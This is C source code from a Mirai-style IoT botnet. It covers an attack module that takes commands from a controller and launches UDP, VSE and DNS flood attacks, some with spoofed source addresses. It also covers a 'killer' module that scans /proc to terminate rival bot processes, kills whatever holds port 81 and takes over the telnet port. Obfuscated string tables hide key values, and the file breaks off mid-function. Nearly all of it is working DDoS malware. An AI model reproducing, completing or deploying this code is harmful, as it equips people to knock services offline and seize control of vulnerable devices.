#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "scanner.h"


uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {5};

BOOL attack_init(void)
{
    int i = 0;

    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);

    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);

    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);

    return TRUE;
}

void attack_kill_all(void)
{
    int i;

#ifdef DEBUG
    printf("[attack] Killing all ongoing attacks\n");
#endif

    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
            kill(attack_ongoing[i], 9);
        attack_ongoing[i] = 0;
    }

#ifdef MIRAI_TELNET
    scanner_init();
#endif
}

void attack_parse(char *buf, int len)
{
    int i = 0;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    if(len < sizeof(uint32_t))
        goto cleanup;

    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof(uint32_t);
    len -= sizeof(uint32_t);

    if(len == 0)
        goto cleanup;

    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof(uint8_t);

    if(len == 0)
        goto cleanup;

    targs_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);
    if(targs_len == 0)
        goto cleanup;

    if(len < ((sizeof(ipv4_t) + sizeof(uint8_t)) * targs_len))
        goto cleanup;

    targs = calloc(targs_len, sizeof(struct attack_target));
    for(i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof(ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof(ipv4_t) + sizeof(uint8_t));

        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }

    if(len < sizeof(uint8_t))
        goto cleanup;

    opts_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);

    if(opts_len > 0)
    {
        opts = calloc(opts_len, sizeof(struct attack_option));
        for(i = 0; i < opts_len; i++)
        {
            uint8_t val_len;

            if(len < sizeof(uint8_t))
                goto cleanup;

            opts[i].key = (uint8_t)*buf++;
            len -= sizeof(uint8_t);

            if(len < sizeof(uint8_t))
                goto cleanup;

            val_len = (uint8_t)*buf++;
            len -= sizeof(uint8_t);

            if(len < val_len)
                goto cleanup;

            opts[i].val = calloc(val_len + 1, sizeof(char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);

    cleanup:
    if(targs != NULL)
        free(targs);
    if(opts != NULL)
        free_opts(opts, opts_len);
}

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid = fork();
    if(pid > 0 || pid == -1)
        return;

    int i = 0;

    for(i = 0; i < methods_len; i++)
    {
        if(methods[i]->vector == vector)
        {
            #ifdef DEBUG
                printf("[attack] starting attack...\n");
            #endif
            methods[i]->func(duration, targs_len, targs, opts_len, opts);
            break;
        }
    }

    exit(0);
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i = 0;

    for(i = 0; i < opts_len; i++)
    {
        if(opts[i].key == opt)
            return opts[i].val;
    }

    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if(val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if(val == NULL)
        return def;
    else
        return inet_addr(val);
}

static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof(struct attack_method));

    method->vector = vector;
    method->func = func;

    methods = realloc(methods, (methods_len + 1) * sizeof(struct attack_method *));
    methods[methods_len++] = method;
}

static void free_opts(struct attack_option *opts, int len)
{
    int i = 0;

    if(opts == NULL)
        return;

    for(i = 0; i < len; i++)
    {
        if(opts[i].val != NULL)
            free(opts[i].val);
    }

    free(opts);
}
#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <errno.h>
#include <fcntl.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"

static ipv4_t get_dns_resolver(void);

void attack_udp_generic(int duration, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    #ifdef DEBUG
        printf("[attack] in udp\n");
        return;
    #endif
    int i = 0, fd = 0;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int time_end = time(NULL) + duration;

    if(data_len > 1460)
        data_len = 1460;

    if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to create raw socket. Aborting attack\n");
        #endif
        return;
    }
    i = 1;
    if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to set IP_HDRINCL. Aborting\n");
        #endif
        close(fd);
        return;
    }

    for(i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if(dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
    }

    while(TRUE)
    {
        for(i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);

            if(targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if(source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if(ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if(sport == 0xffff)
                udph->source = rand_next();
            if(dport == 0xffff)
                udph->dest = rand_next();

            if(data_rand)
            {
                rand_alpha_str(data, data_len);
                data[data_len] = 0;
            }

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + data_len);

            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        
        if(time(NULL) > time_end)
            break;
    }
}

void attack_udp_vse(int duration, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    #ifdef DEBUG
        printf("[attack] In vse\n");
        return;
    #endif
    int i = 0, fd = 0;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
    char *vse_payload;
    int vse_payload_len = 0;
    int time_end = time(NULL) + duration;

    table_unlock_val(TABLE_ATK_VSE);
    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);

    if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to create raw socket. Aborting attack\n");
        #endif
        return;
    }
    i = 1;
    if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to set IP_HDRINCL. Aborting\n");
        #endif
        close(fd);
        return;
    }

    for(i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(128, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if(dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + 4 + vse_payload_len);

        *((uint32_t *)data) = 0xffffffff;
        data += sizeof(uint32_t);
        util_memcpy(data, vse_payload, vse_payload_len);
    }

    while(TRUE)
    {
        for(i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);

            if(targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if(ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if(sport == 0xffff)
                udph->source = rand_next();
            if(dport == 0xffff)
                udph->dest = rand_next();

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);

            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        
        if(time(NULL) > time_end)
            break;
    }
}

void attack_udp_dns(int duration, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    #ifdef DEBUG
        printf("[attack] In dns\n");
        return;
    #endif
    int i = 0, fd = 0;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
    uint16_t dns_hdr_id = attack_get_opt_int(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
    uint8_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    int domain_len = 0;
    ipv4_t dns_resolver = get_dns_resolver();
    int time_end = time(NULL) + duration;

    if(domain == NULL)
    {
        #ifdef DEBUG
            printf("[attack] cannot send DNS flood without a domain\n");
        #endif
        return;
    }
    domain_len = util_strlen(domain);

    if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to create raw socket. Aborting attack\n");
        #endif
        return;
    }
    i = 1;
    if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to set IP_HDRINCL. Aborting\n");
        #endif
        close(fd);
        return;
    }

    for(i = 0; i < targs_len; i++)
    {
        int ii = 0;
        uint8_t curr_word_len = 0, num_words = 0;
        struct iphdr *iph;
        struct udphdr *udph;
        struct dnshdr *dnsh;
        char *qname, *curr_lbl;
        struct dns_question *dnst;

        pkts[i] = calloc(600, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        dnsh = (struct dnshdr *)(udph + 1);
        qname = (char *)(dnsh + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question));
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if(dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = dns_resolver;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question));

        dnsh->id = htons(dns_hdr_id);
        dnsh->opts = htons(1 << 8);
        dnsh->qdcount = htons(1);

        *qname++ = data_len;
        qname += data_len;

        curr_lbl = qname;
        util_memcpy(qname + 1, domain, domain_len + 1);

        for(ii = 0; ii < domain_len; ii++)
        {
            if(domain[ii] == '.')
            {
                *curr_lbl = curr_word_len;
                curr_word_len = 0;
                num_words++;
                curr_lbl = qname + ii + 1;
            }
            else
                curr_word_len++;
        }
        *curr_lbl = curr_word_len;

        dnst = (struct dns_question *)(qname + domain_len + 2);
        dnst->qtype = htons(PROTO_DNS_QTYPE_A);
        dnst->qclass = htons(PROTO_DNS_QCLASS_IP);
    }

    while(TRUE)
    {
        for(i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1);
            char *qrand = ((char *)(dnsh + 1)) + 1;

            if(ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if(sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if(dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if(dns_hdr_id == 0xffff)
                dnsh->id = rand_next() & 0xffff;

            rand_alpha_str((uint8_t *)qrand, data_len);
            qrand[data_len] = 0;

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question));

            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        
        if(time(NULL) > time_end)
            break;
    }
}

void attack_udp_plain(int duration, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    #ifdef DEBUG
        printf("[attack] In udp plain %d\n", duration);
        //return;
    #endif

    int i = 0;
    char **pkts = calloc(targs_len, sizeof(char *));
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    int time_end = time(NULL) + duration;

    if(sport == 0xffff)
    {
        sport = rand_next();
    }
    else
    {
        sport = htons(sport);
    }

    #ifdef DEBUG
        printf("[attack] after args\n");
    #endif

    for(i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof(char));

        if(dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {

            #ifdef DEBUG
                printf("[attack] failed to create udp socket. Aborting attack\n");
            #endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if(bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1)
        {
            #ifdef DEBUG
                printf("[attack] failed to bind udp socket.\n");
            #endif
        }

        if(targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if(connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
        {
            #ifdef DEBUG
                printf("[attack] failed to connect udp socket.\n");
            #endif
        }
    }

    #ifdef DEBUG
        printf("[attack] after setup\n");
    #endif

    while(TRUE)
    {
        for(i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            if(data_rand)
            {
                rand_alpha_str(data, data_len);
                data[data_len] = 0;
            }

            #ifdef DEBUG
                errno = 0;
                if(send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
                {
                    printf("[attack] send failed: %d\n", errno);
                }
                else
                {
                    printf("[attack] .\n");
                }
            #else
                send(fds[i], data, data_len, MSG_NOSIGNAL);
            #endif
        }
        
        if(time(NULL) > time_end)
            break;
    }
}

static ipv4_t get_dns_resolver(void)
{
    int fd = 0;

    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if(fd >= 0)
    {
        int ret = 0, nspos = 0;
        char resolvbuf[2048];

        ret = read(fd, resolvbuf, sizeof(resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        if(nspos != -1)
        {
            int i = 0;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;

            for(i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];

                if(!finished_whitespace)
                {
                    if(c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }

                if((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }

            if(found)
            {
                #ifdef DEBUG
                    printf("[attack] Found local resolver: '%s'\n", ipbuf);
                #endif
                return inet_addr(ipbuf);
            }
        }
    }

    switch(rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8,8,8,8);
    case 1:
        return INET_ADDR(74,82,42,42);
    case 2:
        return INET_ADDR(64,6,64,6);
    case 3:
        return INET_ADDR(4,2,2,2);
    }
}
#define _GNU_SOURCE

#ifdef WICKED_KILLER

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid = 0;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    if(killer_kill_by_port(htons(81)))
    {
        tmp_bind_addr.sin_port = htons(23);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }

    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    #ifdef DEBUG
        printf("[killer] memory scanning processes\n");
    #endif

    while(TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
            #ifdef DEBUG
                printf("[killer] failed to open /proc!\n");
            #endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while((file = readdir(dir)) != NULL)
        {
            if(*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char maps_path[64], *ptr_maps_path = maps_path, realpath[PATH_MAX];
            int rp_len = 0, fd = 0, pid = util_atoi(file->d_name, 10);

            scan_counter++;
            if(pid <= killer_highest_pid)
            {
                if(time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    #ifdef DEBUG
                        printf("[killer] %d seconds have passed since last scan. re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
                    #endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if(pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }

            if(pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_MAPS);

            #ifdef DEBUG
                printf("[killer] scanning pid %d\n", pid);
            #endif

            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_MAPS, NULL));

            #ifdef DEBUG
                printf("[killer] scanning %s\n", maps_path);;
            #endif

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_MAPS);

            if(maps_scan_match(maps_path))
            {
                kill(pid, 9);
            }

            util_zero(maps_path, sizeof(maps_path));

            sleep(1);
        }

        closedir(dir);
    }

    #ifdef DEBUG
        printf("[killer] finished\n");
    #endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    #ifdef DEBUG
        printf("[killer] finding and killing processes holding port %d\n", ntohs(port));
    #endif

    util_itoa(ntohs(port), 16, port_str);
    if(util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if(fd == -1)
        return 0;

    while(util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while(buffer[i] != 0 && buffer[i] != ':')
            i++;

        if(buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while(buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if(util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while(column_index < 7 && buffer[++i] != 0)
            {
                if(buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if(in_column == TRUE)
                        column_index++;

                    if(in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if(listening_state == FALSE)
                continue;

            while(buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if(util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }

    close(fd);

    if(util_strlen(inode) == 0)
    {
        #ifdef DEBUG
            printf("failed to find inode for port %d\n", ntohs(port));
        #endif

        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);

        return 0;
    }

    #ifdef DEBUG
        printf("found inode \"%s\" for port %d\n", inode, ntohs(port));
    #endif

    if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if(*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if(readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if((fd_dir = opendir(path)) != NULL)
            {
                while((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if(readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if(util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);

    return ret;
}

static BOOL maps_scan_match(char *path)
{
    char rdbuf[5000];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    char *m_mirai, *m_sora1, *m_sora2, *m_owari, *m_josho, *m_apollo;
    int m_mirai_len, m_sora1_len, m_sora2_len, m_owari_len, m_josho_len, m_apollo_len;
	
    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_EXEC_MIRAI);
    table_unlock_val(TABLE_EXEC_SORA1);
    table_unlock_val(TABLE_EXEC_SORA2);
    table_unlock_val(TABLE_EXEC_OWARI);
